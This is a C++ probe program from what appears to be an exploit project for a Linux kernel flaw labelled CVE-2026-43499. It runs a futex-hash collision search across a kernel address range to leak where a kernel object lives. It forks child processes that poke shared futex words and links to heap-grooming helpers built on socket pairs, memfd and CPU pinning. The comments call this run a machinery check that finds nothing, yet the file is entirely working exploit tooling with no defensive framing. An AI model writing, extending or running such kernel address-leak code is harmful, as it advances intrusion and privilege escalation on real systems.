/** @file tools/snitch_run_probe.cpp
 *  The whole collision search on a device, over a range small enough to watch.
 *
 *  This is the first run of the rewritten search end to end: it maps the region its
 *  children share, forks a cohort that pokes the words, hands out the times, and only
 *  then walks a range asking the real futex bucket hash whether any address answers.
 *  The object it is looking for is not actually in that range, so the honest answer is
 *  that it searched and found nothing -- what is being proved here is the machinery, not
 *  a found address: real forks, real pokes, real hashing, and a search that stops when
 *  the range does.
 *
 *  Unbuffered and bounded, as every probe here now is: a probe that hangs with its
 *  evidence still in a buffer explains nothing about why it hung.
 */
#include <cstdio>
#include <cstdint>

#include "backend/cve_2026_43499/leak/futex_hash.hpp"
#include "backend/cve_2026_43499/leak/snitch_run.hpp"
#include "backend/cve_2026_43499/leak/snitch_seam_linux.hpp"
#include "backend/cve_2026_43499/memory/heap_seam_linux.hpp"

namespace {
    using ghostlock::backend::cve_2026_43499::leak::CollisionBuckets;
    using ghostlock::backend::cve_2026_43499::leak::FutexHashContext;
    using ghostlock::backend::cve_2026_43499::leak::futex_hash_context_bucket;
    using ghostlock::backend::cve_2026_43499::leak::futex_hash_context_init;
    using ghostlock::backend::cve_2026_43499::leak::LinuxSnitchSeam;
    using ghostlock::backend::cve_2026_43499::leak::MapResult;
    using ghostlock::backend::cve_2026_43499::leak::ThreadEntry;
    using ghostlock::backend::cve_2026_43499::leak::ThreadResult;
    using ghostlock::backend::cve_2026_43499::leak::RegionInputs;
    using ghostlock::backend::cve_2026_43499::leak::run_snitch_search;
    using ghostlock::backend::cve_2026_43499::leak::RunOutcome;
    using ghostlock::backend::cve_2026_43499::leak::run_verdict_name;
    using ghostlock::backend::cve_2026_43499::leak::RunVerdict;
    using ghostlock::backend::cve_2026_43499::leak::ScanRange;
    using ghostlock::backend::cve_2026_43499::leak::ScanStrides;
    using ghostlock::backend::cve_2026_43499::leak::SnitchPatience;
    using ghostlock::backend::cve_2026_43499::leak::SnitchSetup;
    using ghostlock::backend::cve_2026_43499::memory::LinuxHeapSeam;
    using ghostlock::backend::cve_2026_43499::memory::SeamResult;

    /** Both seams in one: the search forks through the heap seam and maps through its own. */
    struct DeviceSeam final {
        static MapResult map_shared(std::size_t bytes) noexcept { return LinuxSnitchSeam::map_shared(bytes); }
        static SeamResult unmap(void *address, std::size_t bytes) noexcept { return LinuxSnitchSeam::unmap(address, bytes); }
        static SeamResult futex_wait_private(std::uint32_t *word, std::uint32_t expected) noexcept {
            return LinuxSnitchSeam::futex_wait_private(word, expected);
        }
        static SeamResult futex_wait_private_until(std::uint32_t *word, std::uint32_t expected,
                                                    std::int64_t timeout_us) noexcept {
            return LinuxSnitchSeam::futex_wait_private_until(word, expected, timeout_us);
        }
        static SeamResult futex_wake_private(std::uint32_t *word, std::int32_t waiters) noexcept {
            return LinuxSnitchSeam::futex_wake_private(word, waiters);
        }
        static ThreadResult start_thread(ThreadEntry entry, void *argument) noexcept {
            return LinuxSnitchSeam::start_thread(entry, argument);
        }
        static SeamResult join_thread(unsigned long handle) noexcept { return LinuxSnitchSeam::join_thread(handle); }
        static SeamResult page_size() noexcept { return LinuxHeapSeam::page_size(); }
        static SeamResult open_memfd(std::uint64_t pid) noexcept { return LinuxHeapSeam::open_memfd(pid); }
        static SeamResult close_fd(std::int32_t fd) noexcept { return LinuxHeapSeam::close_fd(fd); }
        static SeamResult socket_pair(std::int32_t *out) noexcept { return LinuxHeapSeam::socket_pair(out); }
        static SeamResult set_socket_buffer(std::int32_t fd, std::int32_t bytes) noexcept {
            return LinuxHeapSeam::set_socket_buffer(fd, bytes);
        }
        static SeamResult set_nonblocking(std::int32_t fd) noexcept { return LinuxHeapSeam::set_nonblocking(fd); }
        static SeamResult send_bytes(std::int32_t fd, const void *data, std::size_t bytes) noexcept {
            return LinuxHeapSeam::send_bytes(fd, data, bytes);
        }
        static SeamResult send_buffer(std::int32_t fd, std::size_t bytes) noexcept {
            return LinuxHeapSeam::send_buffer(fd, bytes);
        }
        static SeamResult fork_child() noexcept { return LinuxHeapSeam::fork_child(); }
        static SeamResult stop_child(std::uint64_t pid) noexcept { return LinuxHeapSeam::stop_child(pid); }
        static SeamResult yield_now() noexcept { return LinuxHeapSeam::yield_now(); }
        static SeamResult pin_to_processor(std::int32_t cpu) noexcept { return LinuxHeapSeam::pin_to_processor(cpu); }
        static void exit_child() noexcept { LinuxHeapSeam::exit_child(); }
    };

}  // namespace

int main() {
    std::setvbuf(stdout, nullptr, _IONBF, 0U);
    std::printf("snitch run probe\n");

    FutexHashContext hash{};
    if (futex_hash_context_init(&hash, 256U) != 0) {
        std::printf("  hash init FAILED\n");
        return 1;
    }
    CollisionBuckets buckets;
    (void) futex_hash_context_init(&buckets.context, 256U);
    buckets.mm = 0U;

    SnitchSetup setup{};
    setup.collisions = 4U;
    setup.thread_count = 1U;
    setup.futex_table_size = 256U;
    RegionInputs region{};
    region.header_bytes = 64U;
    region.collisions = 4U;
    region.thread_count = 4U;
    region.total_pokes = 512U;
    region.page_size = 4096U;
    region.word_bytes = 8U;
    region.handle_bytes = 8U;
    SnitchPatience patience{};
    patience.wake_rounds = 200U;
    patience.round_timeout_us = 2000;
    ScanStrides strides{};
    strides.coarse = 1ULL << 20U;
    strides.slab = 4096U;
    strides.candidate = 512U;
    ScanRange range{};
    range.start = 0xffff800000000000ULL;
    range.end = range.start + (1ULL << 20U);
    /* The addresses the rule compares are the cohort own words -- the ones the kernel has
     *  been hashing all along. Anything else would be asking whether a set of addresses
     *  agrees about a candidate while the cohort hammered a different set. */
    std::uint64_t addresses[4] = {0U, 0U, 0U, 0U};

    /* The words live in the region the caller maps, one per collision. */
    const MapResult words_region = DeviceSeam::map_shared(4096U);
    if (words_region.address == nullptr) {
        std::printf("  words mapping FAILED errno=%d\n", words_region.error);
        return 1;
    }
    auto *base = static_cast<unsigned char *>(words_region.address);
    std::uint32_t *word_ptrs[4] = {reinterpret_cast<std::uint32_t *>(base),
                                   reinterpret_cast<std::uint32_t *>(base + 64),
                                   reinterpret_cast<std::uint32_t *>(base + 128),
                                   reinterpret_cast<std::uint32_t *>(base + 192)};
    for (std::size_t i = 0U; i < 4U; ++i) {
        addresses[i] = reinterpret_cast<std::uint64_t>(word_ptrs[i]);
    }

    const RunOutcome outcome = run_snitch_search<DeviceSeam>(setup, region, patience, 4096U, word_ptrs, 4U,
                                                             strides, range, false, buckets, addresses, 4U);
    std::printf("  status=%s rounds=%u pokes_wanted=%zu probes=%zu found=%llx errno=%d\n",
                run_verdict_name(outcome.status), outcome.rounds, outcome.pokes_wanted, outcome.probes,
                static_cast<unsigned long long>(outcome.found), outcome.error);
    if (outcome.region != nullptr) {
        const auto *back = reinterpret_cast<const volatile std::uint32_t *>(
            static_cast<const unsigned char *>(outcome.region) + 4096U);
        const auto *stopword = reinterpret_cast<const volatile std::uint32_t *>(
            static_cast<const unsigned char *>(outcome.region) + 4100U);
        std::printf("  region readback: counter=%u stop=%u bytes=%zu\n", *back, *stopword,
                    outcome.region_bytes);
    }
    if (outcome.region != nullptr) {
        const SeamResult gone = DeviceSeam::unmap(outcome.region, outcome.region_bytes);
        std::printf("  unmap region: value=%lld errno=%d\n", static_cast<long long>(gone.value), gone.error);
    }
    const auto gone_words = DeviceSeam::unmap(words_region.address, 4096U);
    std::printf("  unmap words:  value=%lld errno=%d\n", static_cast<long long>(gone_words.value), gone_words.error);
    /* What the probe is allowed to prove: that the machinery ran. It is not looking for the
     *  real object -- a cohort of two members agrees about far too much for that, so the
     *  address it stops on is whichever one the rule accepted first. What matters is that
     *  the cohort poked, the parent noticed, and the walk then ran over a real range. */
    const bool ok = (outcome.status == RunVerdict::Found || outcome.status == RunVerdict::NotFound) &&
                     outcome.probes > 0U && outcome.rounds > 0U;
    std::printf("snitch run probe: %s\n", ok ? "PASS" : "FAIL");
    return ok ? 0 : 1;
}
